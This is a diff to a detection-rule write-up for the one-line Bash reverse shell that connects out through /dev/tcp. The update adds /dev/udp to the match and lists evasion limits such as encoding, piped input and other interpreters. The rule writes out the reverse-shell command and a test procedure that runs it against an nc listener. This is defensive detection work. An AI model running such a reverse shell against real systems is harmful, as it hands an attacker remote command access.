@@ -14,7 +14,7 @@
 Detects a shell command that opens a network connection through /dev/tcp, the classic one-line Bash reverse shell that gives an attacker remote command access.
 
 ## Detection logic
-A bash or sh process whose command line contains `/dev/tcp/`, for example `bash -i >& /dev/tcp/<ip>/<port> 0>&1`.
+A bash or sh process whose command line contains `/dev/tcp/` or `/dev/udp/`, for example `bash -i >& /dev/tcp/<ip>/<port> 0>&1`. These are bash's built-in pseudo-devices for opening a network socket, which is how a reverse shell connects back without any extra tool.
 
 ## How to test
 In an isolated Linux VM, start a listener on another test host (`nc -lvnp 4444`) and run `bash -c "bash -i >& /dev/tcp/<test-ip>/4444 0>&1"`. Stop it straight afterwards.
@@ -28,6 +28,11 @@ Allow-list monitoring scripts that use /dev/tcp for port checks. Raise priority 
 
 ## Limitations
 Reverse shells can use other tools (nc, python, perl, socat) or other syntax, and those are not covered here. Auditd must log full command lines, or the field will be empty.
+
+- On Debian and Ubuntu, `/bin/sh` is usually `dash`, which does not support `/dev/tcp`. A reverse shell written for `sh` only works there if it is run through `bash`, so the match is most meaningful for bash.
+- Obfuscation (hex, octal or base64 encoding, variable concatenation, string splitting) can hide `/dev/tcp/` from the command line.
+- Commands fed through a pipe or standard input never appear on the command line, so this rule will not see them. Auditd or eBPF process and socket telemetry, which shows a shell opening an outbound connection, is stronger evidence.
+- Other shells and interpreters (zsh, python, perl, nc, socat) use different syntax and need their own rules.
 
 ## Validation results
 _Not yet run._
